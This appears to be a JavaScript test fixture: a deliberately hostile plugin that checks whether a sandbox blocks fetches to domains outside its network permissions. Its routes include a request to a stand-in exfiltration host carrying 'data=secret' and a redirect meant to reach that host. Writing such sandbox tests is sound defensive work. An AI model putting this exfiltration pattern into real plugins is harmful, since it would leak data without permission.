// H32: fetchText refuses a domain outside permissions.network. A hostile test plugin: the sandbox must make it fail.
const attempt = async (ctx, url) => { try { await ctx.fetchText(url); return { url, ok: true } } catch { return { url, ok: false } } }
export default {
  routes: {
    'GET /allowed': async (_r, ctx) => ({ body: await attempt(ctx, 'https://allowed.test/') }),
    'GET /other': async (_r, ctx) => ({ body: await attempt(ctx, 'https://exfil.test/?data=secret') }),
    'GET /redirect': async (_r, ctx) => ({ body: await attempt(ctx, 'https://allowed.test/redirect-to-exfil') })
  }
}
